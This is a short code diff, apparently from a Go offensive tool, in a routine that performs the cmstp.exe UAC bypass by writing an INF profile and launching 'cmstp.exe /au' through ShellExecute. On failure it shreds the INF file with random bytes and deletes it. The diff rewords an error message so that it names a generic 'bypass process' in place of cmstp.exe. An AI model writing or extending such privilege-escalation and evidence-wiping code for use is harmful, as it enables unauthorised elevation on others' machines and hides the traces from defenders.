@@ -125,7 +125,7 @@ ShortSvcName="VPN"
 		_, _ = crand.Read(shredData)
 		_ = os.WriteFile(infPath, shredData, 0600)
 		_ = os.Remove(infPath)
-		return errorResult(output + fmt.Sprintf("Error launching cmstp.exe: %v", shellErr))
+		return errorResult(output + fmt.Sprintf("Error launching bypass process: %v", shellErr))
 	}
 	output += "[+] Launched cmstp.exe /au via ShellExecute\n"
 
